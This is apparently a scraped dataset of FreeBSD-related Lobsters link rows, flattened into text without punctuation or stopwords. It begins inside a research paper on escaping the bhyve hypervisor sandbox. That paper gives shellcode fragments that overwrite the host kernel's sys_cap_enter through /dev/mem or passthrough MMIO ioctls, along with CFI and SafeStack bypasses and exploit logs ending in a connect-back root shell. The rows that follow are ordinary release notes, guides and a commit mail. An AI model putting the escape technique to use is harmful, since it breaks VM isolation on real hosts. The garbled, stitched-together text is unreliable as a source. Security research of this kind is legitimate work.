tableoffset else pi pimsixpbapageoffset tableoffset tablesize pi pimsixpbapage mmap null protread protwrite mapshared memfd start pi pimsixpbapageoffset map everything msix table tableoffset len tableoffset error vmmappptdevmmio ctx b f start len base skip msix table map everything beyond end msix table remaining len remaining error vmmappptdevmmio ctx b f start len base physical page msix table directly mapped guest address space using vmmappptdevmmio access pba page shared msix table msix pba emulated mapping devmem interface using mmap read write pba allowed based offset memory access page direct access msix table shared page avoided handle devmem interface opened passthruinit remains open till lifetime process define pathmem devmem static int passthruinit struct vmctx ctx struct pcidevinst pi char opts memfd memfd open pathmem ordwr caprightsset right capmmaprw caprightslimit memfd right errno enosys two interesting thing notice overall pci passthrough implementation open handle devmem interface capmmaprw right within sandboxed process freebsd restrict access memory file like linux configstrictdevmem vmmappptdevmmio ioctl command map host memory page guest address space supporting passthrough however ioctl validate host physical address mapping requested host address may may belong bar mapped device used escape sandbox mapping arbitrary host memory within sandbox ability read write arbitrary physical address initial plan find overwrite ucred credential structure bhyve process searching system memory locate ucred structure could timeconsuming alternate approach target deterministic allocation physical address space kernel base physical address freebsd system randomized always start guest overwrite host kernel text segment escape sandbox come payload disable capability let analyze syscapenter syscall syscapenter system call set credflagcapmode flag crflags element ucred structure enable capability mode code kernsyscapabilityc int syscapenter struct thread td struct capenterargs uap incapabilitymode td return newcred crget p td tdproc newcred crflags credflagcapmode procsetcred p newcred macro incapabilitymode defined capsicumh used verify process capability mode enforce restriction define incapabilitymode td td tducred crflags credflagcapmode disable capability mode overwrite system call reachable within sandbox take pointer thread syssysproch ucred syssysucredh structure argument trigger overwritten system call sandboxed process overwritten payload use pointer thread ucred structure disable capability mode set crflags ideal choice turn syscapenter system call since reachable within sandbox take thread structure first argument kernel payload replace syscapenter syscall code root gdb q bootkernelkernel reading symbol bootkernelkernel reading symbol usrlibdebugbootkernelkerneldebug done done gdb macro define offsetof f f gdb p offsetof struct thread tducred struct ucred gdb p offsetof struct ucred crflags uint movq rdi rax get ucred struct ucred tducred xorb rax flip crflags ucred xorq rax rax ret either open handle devmem interface vmmappptdevmmio ioctl command used escape sandbox devmem sandbox escape requires first stage payload executing within sandbox mmap page kernel code syscapenter system call overwrite shellcodec kernelpage payload syscall sysmmap protread protwrite mapshared devmemfd syscapenterphyaddr offsetinpage syscapenterphyaddr int sizeof payload disablecapability kernelpage offsetinpage payload disablecapability payload syscall syscapenter vmmappptdevmmio ioctl sandbox escape requires work guest physical address map host kernel page chosen correctly vmmappptdevmmio command handled vmmvmmdevc series call pptmapmmio vmmapmmio vmmmmioalloc call importance vmmmmioalloc vmmvmmmemc vmobjectt vmmmmioalloc struct vmspace vmspace vmpaddrt gpa sizet len vmpaddrt hpa error vmmapfind vmspace vmmap obj gpa len vmfsnospace vmprotrw vmprotrw vmmapfind function used find free region provided map vmspace vmmap findspace strategy set vmfsnospace mean mmio mapping request succeed free region requested length given guest physical address ideal address use would memory range allocated system memory pci device first stage shellcode executing within sandbox map host kernel page guest return control back guest o shellcodec payload mmiobus payload mmioslot payload mmiofunc payload mmiogpa gpatohostkernel payload mmiohpa syscapenterphyaddr payload mmiolen getpagesize payload syscall sysioctl vmmfd vmmappptdevmmio payload mmio guest o map guest physical address writes turn overwrites host kernel page exploitc warnx mapping gpa pointing host kernel kernelpage mapphyaddress gpatohostkernel getpagesize warnx overwriting syscapenter host kernel offsetinpage syscapenterphyaddr memcpy kernelpage offsetinpage disablecapability void disablecapabilityend void disablecapability finally guest trigger second stage payload call syscapenter disable capability mode interestingly vmmappptdevmmio command sandbox escape work even individual guest vm configured use pci passthrough initialization passthruinit call libvmmapi api vmassignpptdev bind device static int passthruinit struct vmctx ctx struct pcidevinst pi char opts vmassignpptdev ctx bus slot func int vmassignpptdev struct vmctx ctx int bus int slot int func pptdevbus bus pptdevslot slot pptdevfunc func return ioctl ctx fd vmbindpptdev pptdev similarly payload running sandboxed process bind passthrough device using vmbindpptdev ioctl command use vmmappptdevmmio command escape sandbox work pci device configured passthrough loader configuration host owned guest vm shellcodec payload pptdevbus payload pptdevslot payload pptdevfunc payload syscall sysioctl vmmfd vmbindpptdev payload pptdev payload syscall sysioctl vmmfd vmmappptdevmmio payload mmio running vm escape exploit pci passthrough sandbox escape give following output root guest setupbfwctlsandboxbindexploit exploit exploit cpu affinity set exploit changing state identsend exploit reading signature exploit received signature bhyv exploit set reqsize value exploit setting fake structure exploit preparing connect back shellcode exploit sending data overwrite io handler exploit overwriting mmiohint exploit triggering mmio read execute sandbox bypass payload exploit mapping gpa pointing host kernel exploit overwriting syscapenter host kernel exploit triggering mmio read execute connect back payload root guest setupbfwctlsandboxbindexploit root guest nc vvv l connection received id root wheel wheel operator also possible trigger panic host kernel within sandbox adding device twice using vmbindpptdev vmbindpptdev command handling vtdadddevice vmmintelvtdc call panic device already owned explore le interesting complete sandbox escape static void vtdadddevice void arg rid ctxp idx vtdctxpresent panic vtdadddevice device x already owned domain rid ctxp idx coretxt panic vtdadddevice device already owned domain cpuid kdb stack backtrace analysis cfi safestack hardenedbsd bhyve hardenedbsd come mitigation like aslr pie clang controlflow integrity cfi safestack etc addition mitigation created new set challenge exploit development initial plan test mitigation using however turning information disclosure looked le feasible analysis continue analysis reverted patch vga bug information disclosure combination two bug vga bug disclose bhyve base address fwctl bug arbitrary rw indirect call cfi verifies target address point valid function matching function pointer type detail mentioned section achieving arbitrary read write work even cfi know bhyve base address function pciemuliohandler used overwrite handler inouthandlers structure function pciemuldior pciemuldiow used fake pcidevemu structure matching function pointer type violate cfi rule making indirect function call cfi instrumentation generates jump table branch instruction actual target function address jump table entry valid target cfi used overwriting callback symbol target function referred cfi since good job analyzing cfi enabled binary jump table located finding reference symbol cfi usrsbinbhyve usrlibdebugusrsbinbhyvedebug aaaa axt sympciemuldiowcfi sympciemuldiow code jmp sympciemuldiowcfi axt sympciemuldiorcfi sympciemuldior code jmp sympciemuldiorcfi rest section detail target overwrite cfi safestack place previously detailed technique longer work cfi bypass due lack crossdso cfi scope research safestack bypass using neglected pointer safestack protects stack buffer overflow separating program stack two region safe stack unsafe stack safe stack store critical data like return address register spill etc need protection stack buffer overflow protection arbitrary memory writes safestack relies randomization information hiding aslr strong enough prevent attacker predicting address safe stack pointer safe stack stored outside safe stack however always case lot neglected pointer safe stack already demonstrated bhyve store pointer stack data global variable initialization main mevent thread pointer guestuuidstr vmname progname optarg bhyverunc interesting variable storing pointer stack environ progname root renorobert gdb q p pidof bhyve attaching process reading symbol usrsbinbhyve reading symbol usrlibdebugusrsbinbhyvedebug done done gdb xgx progname progname mevent thread also store pointer pthread structure meventtid declared meventc static pthreadt meventtid void meventdispatch void meventtid pthreadself arbitrary read primitive created fwctl bug disclose safe stack address mevent thread reading variable mentioned let consider case meventtid pthread structure pthread pthreadattr structure defined libthrthreadthrprivateh useful element leaking stack address include unwindstackend stackaddrattr stacksizeattr output analysis gdb procstat gdb print struct pthread meventtid unwindstackend void gdb print struct pthread meventtid attrstackaddrattr void gdb print struct pthread meventtid attrstacksizeattr gdb print struct pthread meventtid attrstackaddrattr struct pthread meventtid attrstacksizeattr void root renorobert procstat v pidof bhyve rw df safe stack location mevent thread leaked arbitrary write used overwrite return address function call also possible calculate safe stack address thread since relative address mevent thread safe stack next find target function call overwrite return address event dispatcher function meventdispatch section go infinite loop waiting event using blocking call kevent void meventdispatch void ret kevent mfd null eventlist meventmax null meventhandle eventlist ret overwriting return address blocking call kevent give rip control soon event triggered bhyve output proofofconcept code demonstrating rip control root guest setupccfisafestackbypass exploit exploit triggering info leak using exploit mevent located offset exploit leaked powerhandler address exploit bhyve base address exploit changing state identsend exploit reading signature exploit received signature bhyv exploit set reqsize value exploit setting fake structure exploit sending data overwrite io handler exploit leaking safe stack address reading pthread struct exploit leaked safe stack address exploit located meventdispatch rip root renorobert gdb q p pidof bhyve attaching process reading symbol usrsbinbhyve reading symbol usrlibdebugusrsbinbhyvedebug done done switching lwp process kevent kevents file directory gdb c continuing thread mevent received signal sigbus bus error thrkevent kq optimized changelist optimized nchanges optimized eventlist optimized nevents optimized gdb xi rip retq gdb xgx rsp registering arbitrary signal handler using acpi shutdown next bypass let revisit smicmdhandler detailed section writing value bhyveacpidisable smi command port remove event handler sigterm also register signal handler static sigt oldpowerhandler static int smicmdhandler struct vmctx ctx int vcpu int int port int byte eax void arg case bhyveacpidisable powerbutton null meventdelete powerbutton powerbutton null signal sigterm oldpowerhandler oldpowerhandler overwritten using arbitrary write provided fwctl bug call signal thus us overwritten value allowing guest register arbitrary address signal handler sigterm signal plan invoke arbitrary address signal trampoline perform cfi validation signal trampoline code invokes signal handler invokes sigreturn system call restore thread state callq rsp lea rsp rdi pushq mov rax syscall however call signal directly invoke sigaction system call libthr library load installs interposing handler many function libc including sigaction int sigaction int sig const struct sigaction act struct sigaction oact return int int const struct sigaction struct sigaction libcinterposing interpossigaction sig act oact libthr signal handling code implemented libthrthreadthrsigc interposing function thrsigaction store application registered signal handling information array thrsigact sigmaxsig libthr also register single signal handler thrsighandler dispatch application registered signal handler using information stored thrsigact signal received thrsighandler call handlesignal invoke respective signal handler indirect call static void handlesignal struct sigaction actp int sig siginfot info ucontextt ucp sigfunc actp sasigaction actp saflags sasiginfo sigfunc sig info ucp else ohandler sigfunc sig info sicode struct sigcontext ucp info siaddr sighandlert sigfunc libthrso compiled cfi indirect call also protected order redirect execution signal trampoline guest overwrite libcinterposing interpossigaction entry address sigaction system call instead thrsigaction since sigaction thrsigaction function type valid target cfi guest register fake signal handler wait host trigger acpi shutdown using sigterm output proofofconcept rip control using signal handler root guest setupccfisignalbypass exploit exploit triggering info leak using exploit mevent located offset exploit leaked powerhandler address exploit bhyve base address exploit changing state identsend exploit reading signature exploit received signature bhyv exploit set reqsize value exploit setting fake structure exploit sending data overwrite io handler exploit libc base address exploit overwriting libc interposing table entry sigaction exploit overwriting oldpowerhandler exploit disabling acpi shutdown register fake signal handler root guest cfibypasscfisignalbypass root host vm stop freebsdvm sending acpi shutdown freebsdvm root host gdb q p pidof bhyve attaching process reading symbol usrsbinbhyve reading symbol usrlibdebugusrsbinbhyvedebug done done kevent kevents file directory gdb c continuing thread mevent received signal sigterm terminated kevent kevents gdb c continuing thread mevent received signal sigbus bus error gdb xi rip callq rsp gdb xgx rsp information disclosure using crash time hardenedbsd though improved left since bug reintroduced experimental purpose reverting patch conclusion paper detail various technique gain rip control well achieve arbitrary readwrite abusing bhyve internal data structure believe methodology described generic could applicable exploitation similar bug bhyve even analysis hypervisors many thanks ilja van sprundel finding disclosing vga bug detailed first part paper thanks argp huku vat excellent research jemalloc allocator exploitation would also like thank mehdi talbi paul fariello qemu case study paper motivated write one bhyve finally big thanks phrack staff review feedback helped improve article reference privilege escalation vulnerability http setting vga palette http bosasmhackersnetdocsvgawithoutbiosdocspalettesettingpdf hardware level vga svga video programming information page http wwwosdevernetfreevgavgacolorreghtm pseudomonarchia jemallocum http exploiting vlc case study jemalloc heap overflow http shadow android http kqueue generic scalable event notification facility http peoplefreebsdorgjlemonpaperskqueuepdf vm escape qemu case study http wwwphrackorgpapersvmescapeqemucasestudyhtml capsicum practical capability unix http capsicumise bhyve http capsicum support bhyve http bhyve pci passthrough http wikifreebsdorgbhyvepcipassthru put kernel physaddr explicit rather inconsistent maxpagesize http vmmapfind freebsd kernel developer manual http wwwfreebsdorgcgimancgiqueryvmmapfind nested paging bhyve http peoplefreebsdorgneelbhyvebhyvenestedpagingpdf introducing cfi http control flow integrity design documentation http clangllvmorgdocscontrolflowintegritydesignhtml safestack http clangllvmorgdocssafestackhtml bypassing clang safestack fun profit http libthr posix thread library http wwwfreebsdorgcgimancgiquerylibthr manpathfreebsdreleaseports insufficient bound checking bhyve device model http always treat firmware request response size unsigned http source code environment detail experiment set different host operating system running inside vmware fusion nested virtualization enabled vmbhyve used set manage virtual machine freebsd running ubuntu server lts guest b freebsd running freebsd guest c freebsd devel running freebsd setup set graphic yes vm configuration used vmbhyve enable framebuffer device required vga vmbhyve enables frame buffer device uefi also enabled check commented vmrun bash script add frame buffer output vm bhyvedevicefbuf local graphic port listen re wait pas local fbufconf work uefi mode z uefi return analysis detailed section us setup following exploit provided attached code tested environment readmemory proof concept code disclose bhyve heap using vga bug section vgafakearenaexploit full working exploit connect back shellcode using fake arena technique section vgaioportexploit full working exploit connect back shellcode using corrupted inouthandlers structure section vgapciexploit proof concept code demonstrate rip control using pci bar decoding technique section requires libpciaccess installed using aptget install libpciaccessdev setup b apply bhyverunpatch attached code bhyve rebuild source enables fwctl device default without specifying bootrom cd usrsrc patch bhyverunpatch cd usrsrcusrsbinbhyve make make install enable iommu host running vm follow instruction step make sure device available vm running host used usb device passthrough root host pciconf v l vendor vmware device ehci controller class serial bus subclass usb reboot verify device ready passthrough root host vm passthru device bhyve id ready description host bridge agp bridge isa gigabit ethernet controller copper creative lab yes ehci controller ehci controller marked ready set parameter vm configuration used vmbhyve expose device vm analysis detailed section us setup b following exploit provided attached code tested environment fwctlsandboxdevmemexploit full working exploit connect back shellcode using devmem sandbox escape requires parameter configured fwctlsandboxmapexploit full working exploit connect back shellcode using vmmappptdevmmio ioctl command requires parameter configured fwctlsandboxbindexploit full working exploit connect back shellcode using vmmappptdevmmio vmbindpptdev ioctl command configure host device passthrough set parameter set kernel panic detailed section triggered running exploit setup c setup us downloaded use information provided setup port necessary apply bhyverunpatch attached code revert vga patch bhyve cd usrsrc patch bhyverunpatch fetch http patch r bhyvepatch cd usrsrcusrsbinbhyve make make install analysis detailed section us setup c following proof concept provided attached code tested environment cfisafestackbypass proof concept code demonstrate rip control bypassing safestack cfisignalbypass proof concept code demonstrate rip control using signal trampoline address rop gadget might need readjustment code vmbhyve management system freebsd bhyve virtual machine http githubcomchurchersvmbhyve vmrun http githubcomchurchersvmbhyveblobmasterlibvmrun bhyve pci passthrough http wikifreebsdorgbhyvepcipassthru http githubcomchurchersvmbhyveblobmastersampletemplatesconfigsample http use port hardenedbsd http privilege escalation vulnerability http codezip
127,Lobsters,freebsd,FreeBSD,FreeBSD Updates Head to 14.0-CURRENT to Prevent Having 13.0-RELEASE,https://lists.freebsd.org/pipermail/svn-src-head/2020-April/135044.html,freebsd update head prevent,svn commit head gjb freebsdorg http information svnsrchead mailing list,svn commit head glen barber gjb freebsdorg wed apr utc author gjb date wed apr utc new revision url http log update head order prevent modified updating libclangfreebsdccversionh libclangllvmbuildmk sysconfnewverssh syssysparamh index revision working copy targetabi gnueabi endif endif machineabi unknown machinetriple machinearch c h f machineabi machinetriple machinearch c h f machineabi targetabi unknown targettriple targetarch c h f targetabi targettriple targetarch c h f targetabi knownarches bt liblibdwarf endif flua required regenerate syscall file first appeared cycle thus need built older release stable cycle thus need built older release stable branch bootstrapping bt libexecflua bt libliblua index updating updating revision updating working copy handbook item affecting port package system found usrportsupdating please read file running portupgrade note people think freebsd slow freebsd many debugging feature turned kernel note people think freebsd slow freebsd many debugging feature turned kernel userland feature attempt detect incorrect use system primitive encourage loud failure extra sanity checking fail stop semantics also substantially impact index libclangfreebsdccversionh libclangfreebsdccversionh revision libclangfreebsdccversionh working copy freebsd define freebsdccversion define freebsdccversion index libclangllvmbuildmk libclangllvmbuildmk revision libclangllvmbuildmk working copy targetabi gnueabi targetabi endif vendor unknown osversion osversion llvmtargettriple targetarch c h f vendor osversion targetabi llvmbuildtriple buildarch c h f vendor osversion index sysconfnewverssh sysconfnewverssh revision sysconfnewverssh working copy type freebsd revision revision branch branchoverride current release revision branch version type release index syssysparamh syssysparamh revision syssysparamh working copy range undef freebsdversion define freebsdversion master propagated newvers define freebsdversion master propagated newvers freebsdkernel indicates system us kernel freebsd information svnsrchead mailing list
128,Lobsters,freebsd,FreeBSD,GhostBSD 20.03 Now Available,http://www.ghostbsd.org/20.03_release_announcement,ghostbsd available,changed since upgrade done already download http wwwghostbsdorgdownload feedback http tmeghostbsd ghostbsd forum find bug http forumsghostbsdorg http tmeghostbsd donate become patron donate ghostbsd patron,happy announce availability ghostbsd new build come minor system update numerous software application update changed since default pkg configuration point ghostbsd package repository instead freebsdfixed update station make sure run pkg update aloneadded code make sure update icon appears appropriatelyadded wg notnics networkmgr avoid adding wireguard nicsto upgrade done already uname u output pkg update fsudo pkg upgradenote package upgrade pkg update station datewhere download image checksum hybrid iso dvd usb torrent available http wwwghostbsdorgdownload writing iso usb stick bsd dd linux dd ofdevsdc mac dd feedback anything help get involved maybe want discus experience ask u question please contact u telegram http tmeghostbsd ghostbsd forum find bug please reporting bug make sure related bug reported reporting bug please give much detail possible issue reproduce report bug http issuesghostbsdorgprojectsghostbsd need help please visit http forumsghostbsdorg http tmeghostbsd donate become patronwe depend get ghostbsd better system please donate even better become patron donate ghostbsd become ghostbsd patron patreon
129,Lobsters,freebsd,FreeBSD,Self Hosted Hugo Workflow using FreeBSD Jails,https://www.jaredwolff.com/my-latest-self-hosted-hugo-workflow/,self hosted hugo workflow using freebsd jail,hugo wwwjaredwolffcom host create droplet setting freebsd server bastille exoframe check documentation side note plugins building deploying easy victoria drake posted imagemagick optimized site incremental backup restic setting loseforget password backing side note note viewing backup restoring conclusion post,hosting netlify year decided head back self hosting there reason main reasoning control thing workedin post show workflow deploying hugo generated site wwwjaredwolffcom instead using people would go using freebsd jail based server plus show trick learned year bulk image resizing morelet get itwhere host want host service need server vps provider like digital ocean vultr come fan used digital ocean nowto set new server step login digital ocean digital ocean would like support blog click create accountgo account setting security make sure ssh key setupcreate new freebsd droplet make sure use ufs version make sure select month plan simple installs enough make sure ssh key selected finally click green create droplet button ssh done ssh root yourserverip setting freebsd server bastilleup recently everything running docker based platform using exoframe easy almost brainless unfortunate part fact docker take wayyyy many resource plus managing file within docker container much work hosting natively oh checked much space docker using machine lately development machine space alternative freebsd jail using bastillei playing bastille month use make sensebastille allows create portable lightweight freebsd based jail jail container virtually overhead daemon operating system daemon plus jail secure compared worm docker yes may compile port utility though already supported freebsd package manager pkgin section learn get jail running caddy securely host sitelet keep momentum going get ip address server login ssh root get motd message sh prompt woo freebsd generic welcome freebsd let install important bit using pkg freebsd package manager pkg install restic rsync bastille using restic backup rsync transferring file bastille jail setupyou also set static route pfconf example mine extif important need set start using extaddr droplet ip caddy related set blockpolicy return scrub extif fragment reassemble set skip lo table jail persist nat extif jail extaddr container route rdr pas inet proto tcp port caddyaddr port rdr pas inet proto tcp port caddyaddr port enable dynamic rdr see rdranchor rdr block pas quick modulate state antispoof extif inet pas inet proto tcp port ssh flag ssa keep state standard pfconf file bastille make sure edit caddyaddr ip chose also make sure set extaddr match address droplet service like vultr need use extaddr using nat extif jail extif instead nat extif jail extaddr sufficient enough let start firewall get kicked ssh session sysrc pfenable yes service pf start let get bastille configuration way set bastille networking sysrc sysrc service netif cloneup bootstrap base jail start bastille bastille bootstrap update sysrc bastilleenable yes service bastille start set networking fetch latest default base jail use laternext let set jail bastille create caddy bastille start caddy install caddy install binary fetch http tar xvf caddy bastille cp caddy caddy usrlocalbin rm caddy create caddy user bastille cmd caddy pw useradd caddy usrsbinnologin install ca root file bastille pkg caddy install carootnss installing carootnss pkg initialize accept prompt done move next step install complete also configure caddy start boot easiest way use rcd script binsh freebsd headnetcaddyfilescaddyin riggs provide caddy require login keyword shutdown add following line etcrcconflocal etcrcconf enable service caddyenable bool set default set yes enable caddy caddyuser user set user run caddy default caddy caddygroup group set group run caddy default caddy caddyconf path path caddy configuration file default usrlocaletccaddyfileconf etcrcsubr namecaddy rcvarcaddyenable loadrcconfig name caddyenable caddyuser caddy caddygroup caddy caddyconf usrlocaletccaddyfileconf caddylog homecaddycaddylog caddyenv caddypathhomecaddy caddyhttpsport caddyhttpport pidfile varruncaddypid procname usrlocalbincaddy command usrsbindaemon commandargs f p pidfile usrbinenv caddyenv procname agree httpport caddyhttpport httpsport caddyhttpsport conf caddyconf log caddylog caddyargs extracommands reload startprecmdcaddystartprecmd reloadcmdcaddyreloadcmd caddystartprecmd e pidfile install caddyuser g caddygroup devnull pidfile fi caddyreloadcmd kill cat pidfile runrccommand remove caddy executable already create new file vi rcd script paste content script save exitthen make sure file executable using chmod copy caddy containerchmod x caddy bastille cp caddy caddy usrlocaletcrcd finally need caddyfile example one stagejaredwolffcom tl hello jaredwolffcom log homecaddystagejaredwolffcomlog root varwwwstagejaredwolffcom gzip log stderr log refers site specific access logroot refers root public folder machine case common varwww name site set path remember need later caddy generate cert subdomain set tl option email neededfor caddyfile structure check documentationmake file called caddyfileconf copy usrlocaletc caddy container vi caddyfileconf paste caddyfile content save bastille cp caddy caddyfileconf usrlocaletc redirect dns server ip way caddy generatefetch correct certificate start caddy bastille service caddy caddy start check log usrhomecaddycaddylog make sure domain provisioned correctlyside note getting setup ssl cert tough first especially migrating another server site go little bit switch dns setting start caddy using standard caddy also use dns provider plugins make thing little easier caddy running time copy hugo generated asset using rsync next step make building deploying easyi spend ton time programming c code mean spend ton time using makefiles many make gmake gnu make bane existence building deploying make make easy create reusable recipe way know deploy confidence every timemy makefile borrows one victoria drake posted long ago changed bit match need let take tour see inside posix hugoversion optimizeddir optimized contentdir content destdir public server user user first section contains variable use tell function later also reference posix target mean makefile portable different version makethen popped logic determine whether deploying stage production set place deployed ifdef production info building production target www else info building development baseurl baseurl http stagejaredwolffcom target stage endif default recipe use development workflow use production workflow invoke make like add extra friction deploy process good step though way sure deploy going right place full path deploydir usrlocalbastillejailscaddyrootpathto target jaredwolffcom using target variable define path server asset using bastille organize jail path extra lengthly long yea lengthly long allows u use rsync deploy file easenow come fun bit full bulk resize using wildcard functionality makefileimages wildcard contentdir image jpg wildcard contentdir image jpg wildcard contentdir image jpeg wildcard contentdir image png wildcard contentdir image jpg wildcard contentdir image jpeg wildcard contentdir image png wildcard contentdir image jpg case create huge space delimited list every image within content directory biggest drawback method space tolerant easy fix make sure photo spaceshere quick dirty bash command use rename file space replace character f mv f f done next rename entry prefix target directory useful want resize optimizedimages subst contentdir optimizeddir image check optimize recipe phony optimize optimize build optimizedimages echo optimizing image rsync r optimizeddir destdir du sh contentdir du sh destdir optimizedimages convert strip compress jpeg resize subst optimizeddir contentdir first call build recipe also optimizedimages recipe later optimize image using convert command imagemagick case resizing file larger wide change accordingly reap benefit optimized siteafter resizing recipe us rsync copy file optimizeddir destdirif take look build recipe first building asset copy photo content dir optimized dir nice thing rsync move file changed thus copy file every time buildfinally deploy recipe phony deploy deploy echo rsync deploydir rsync r del public user server deploydir echo making restic snapshot scp scriptsbackupsh user server rootbackupsh ssh user server sh rootbackupsh deploydir echo site deployed see using rsync sync content public server make sure set user server deploydir case deploydir come usrlocalbastillejailscaddyrootvarwwwwwwjaredwolffcomwhen finally get successful deploy double check everything correct place everything look good start caddy server usingbastille service caddy caddy start deploy also something extra handy deploy restic backup script run talk backup sectionall full makefileposix hugoversion optimizeddir optimized contentdir content destdir public server user root set place deployed ifdef production info building production target www else info building development baseurl baseurl http stagejaredwolffcom target stage endif full path deploydir usrlocalbastillejailscaddyrootvarwww target jaredwolffcom image wildcard contentdir image jpg wildcard contentdir image jpg wildcard contentdir image jpeg wildcard contentdir image png wildcard contentdir image jpg wildcard contentdir image jpeg wildcard contentdir image png wildcard contentdir image jpg optimizedimages subst contentdir optimizeddir image phony build optimize phony clean clean rm rf public rm rf optimized phony serve serve hugo serve phony ssh ssh ssh user server phony build build echo generating site hugo gc minify destdir baseurl rsync av del f f contentdir optimizeddir phony optimize optimize build optimizedimages echo optimizing image rsync r optimizeddir destdir du sh contentdir du sh destdir optimizedimages convert strip compress jpeg resize subst optimizeddir contentdir phony deploy deploy echo rsync deploydir rsync r del public user server deploydir echo making restic snapshot scp scriptsbackupsh user server rootbackupsh ssh user server sh rootbackupsh deploydir echo site deployed handy nugget may want use clean serve ssh helpful testing connectingin end two step deploy process first generates site optimized image second deploying server static hostingincremental backupafter discovering restic sold handy incremental backup need case server using back root folder site way need roll back short stepshere set local restic reposetting upinitializing repo simple important part making sure loseforget password restic init r rootbackups enter password new repository enter password created restic repository rootbackups please note knowledge password required access repository losing password mean data irrecoverably lost set resticpassword environment variable avoid entering password make permanent place export resticpassword password within profile file rootbacking upinvoking restic ssh tough next best bet transfer brief shell script server run deploy content using today binsh export resticpassword password restic backup r rootbackups side note sit look script security reason replace password second argument script way need commitpush password stored static file first set backup password run restic using first command line argument path run backup script would look something like backupsh pathtoyourpublicfolder note need initialize restic backup start backing barf otherwise case placing incremental backup different folder machine way easily accessible fastviewing backupsto view backup run following command restic snapshot r rootbackups g path c enter password repository repository opened successfully password correct snapshot path usrlocalbastillejailscaddyrootvarwwwwwwjaredwolffcom id time host tag vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest vultrguest use list determine need roll back deployrestoringrestoring backup especially live environment need quick viewing backup restore specific backup using idthis restore file back backup made awesome plus overwrite every single apply difference current state stored stateconclusionwe covered ton ground post learned deploy server using vultruse bastille create containerlike jailsset caddy serve static file asset tlsdeploy file using fairly simple makefile rsyncback every deploy using resticin end robust secure simple platform hosting static file service stay tuned post like coming way soon meantime check post thanks reading see next time modified
130,Lobsters,freebsd,FreeBSD,Scripts to Turn Vanilla FreeBSD into Lisp/Ruby Development Environment,https://gitlab.com/duncan-bayne/freebsd-setup,script turn vanilla freebsd lispruby development environment,,script turn vanilla freebsd installation lispy rubyish development environment read
131,Lobsters,freebsd,FreeBSD,BSD Overview (2012),https://www.jimby.name/techbits/abitolder/bsdov/bsdov_04.pdf,bsd overview,,obj endobj xref n n n n n n n n n trailer startxref eof obj stream b ā u tec endstream endobj obj size stream
132,Lobsters,freebsd,FreeBSD,Intel Core i9-10980XE Benchmarks - ,https://www.phoronix.com/scan.php?page=article&item=dfly58-freebsd121-ubuntu2004,intel core benchmark,dragonflybsd freebsdbased desktopfocused ghostbsd ghostbsd ghostbsd dragonflybsd dragonflybsd freebsd freebsd ubuntu ubuntu zfs phoronix test suite,given release earlier month dragonflybsd along recent debut freebsdbased desktopfocused ghostbsd benchmark looking performance freebsd well current state ubuntu test done llvm clang gcc compiler operating system tested comparison included ghostbsd freebsdbased desktopfocused o currenly based freebsd default compiler like freebsd upstream using llvm clang zfs filesystem used default ghostbsd second run ghostbsd switching gcc compiler available well aligning gcc default linux distribution dragonflybsd latest stable release dragonflybsd earlier month default dragonflybsd us gcc compiler filesystem use dragonflybsd second run dragonflybsd upgrading gcc compiler available via pkg freebsd current freebsd stable release zfs default using llvm clang freebsd second run freebsd moving gcc via pkg ubuntu current development snapshot nearfinal ubuntu lts linux kernel default filesystem used gcc compiler ubuntu zfs reinstalling ubuntu making use zfszol root filesystem option order match freebsd zfs setup play testing done system featuring intel core x memory samsung pro nvme solidstate drive nvidia geforce gtx ti graphic system setting operating system test default unless otherwise noted originally plan also test second system amd ryzen threadripper ran issue dragonflybsd appear stem motherboard usb support least intel core system working without issue bsds linux distribution tested via phoronix test suite wide range benchmark carried
133,Lobsters,freebsd,FreeBSD,Installing FreeBSD for Raspberry Pi 1/2/3,https://www.freebsdfoundation.org/freebsd/how-to-guides/installing-freebsd-for-raspberry-pi/,installing freebsd raspberry pi,image writer window step installing freebsd image raspberry pi step writing image file using dd warning example us replace disk location guide take note location remember replace example location remember replace example location step booting raspberry pi connect power source last avoid booting problem step post installation configuration doubt default option used,computer sd slot burning image need root privilege deviceraspberry pi b raspberry pi raspberry pi blank sd micro sd raspberry pi cardwindows user need download latest version image writer windowsfor booting raspberry pi monitor hdmi cable usb keyboard micro usb power source recommended step installing freebsd image raspberry pi visit freebsd release page found done computer using burn image select download link type class raspberry pi using file downloaded xz format decompression tool winzip may needed export file img format step writing image file using dd using sd card extra step need made simply copying file work img file dd command come image writer window user maclinux open terminal located application utility depending o enter following command included explanation command right enter command line warning example us replace disk location log user super user root environment mac may set root account case refer guide requires root password list available disk memory stick listed take note location diskutil unmountdisk unmounts volume target disk remember replace example location dd ifinsertfreebsdimageimg replace insertfreebsdimageimg file name downloaded freebsd website also done dragging file file searching app terminal command copy image memory stick take minute sit back grab snack remember replace example location diskutil eject step booting raspberry pi insert nowconfigured sd micro sd card sd card reader raspberry pi card able inserted one direction connect usb keyboard monitor power source raspberry pi connect power source last avoid booting problem power source connected raspberry pi boot process start usb keyboard used enter command shell displayed monitor freebsd need formatted installation step post installation configuration freebsd booting system automatically start device correctly configured boot freebsd image guide next process found section provide stepbystep guide configure freebsd system doubt default option used option reconfigured later needed something note type password freebsd text appear freebsd running raspberry pi raspberry pi incredibly versatile computer used ton experiment diy project various lightweight desktop setup
134,Lobsters,freebsd,FreeBSD,TrueOS (earlier PC-BSD) is Now Officially Dead,https://www.ixsystems.com/community/threads/is-trueos-abandoned.82183/,trueos earlier pcbsd officially dead,script code,case fractal node mb asus w cpu xeon corsair cooler block ram crucial ecc rdimms hdd wd red ssd xsamsung evo basic vmsjails hba lsi o x kingston ssd boot drive psu corsair version fan front rear corsair commander pro control fan see script code cpu fan cpu radiator front nic intel pro dualgigabit adapter plus onboard intel nics vmdocker host using esxi running pfsense alongside freenas separate dual intel nic added dedicated pfsense vm
135,Lobsters,freebsd,FreeBSD,Collection of Scripts to Control Fan Speed on NAS Boxes,https://github.com/khorton/nas_fan_control,collection script control fan speed na box,nasfancontrol http forumsfreenasorgindexphp http forumsfreenasorgindexphp,nasfancontrol collection script control fan speed na box pidfancontrolpl perl fan control script based hybrid fan control script created stux posted http forumsfreenasorgindexphp stux script modified replacing fan control loop pid controller version script setting gain used author norco following fan x noctua pwm fan hard drive wall fan replaced x noctua pwm fan chassis exit fan x noctua cpu cooler hard drive fan connected fan header assigned hard drive temperature control portion script chassis exit fan cpu cooler connected fan header assigned cpu temperature control portion script see script info commentary discussion freenas forum http forumsfreenasorgindexphp
